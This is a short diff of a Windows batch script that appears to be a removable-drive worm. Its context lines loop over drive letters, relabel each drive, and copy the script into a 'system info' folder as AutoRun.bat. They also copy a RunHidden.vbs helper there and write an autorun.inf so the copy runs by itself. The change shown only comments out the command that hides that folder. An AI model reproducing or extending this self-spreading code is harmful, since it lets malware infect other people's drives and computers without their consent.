@@ -33,7 +33,7 @@ for %%d in (D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
         label %%d: U$B_%randomLetter%
 
         md "%%d:\system info"
-        attrib +h "%%d:\system info"
+        @rem attrib +h "%%d:\system info"
         copy "%~f0" "%%d:\system info\AutoRun.bat"
         copy "RunHidden.vbs" "%%d:\system info\RunHidden.vbs"
         echo [autorun] > "%%d:\system info\autorun.inf"
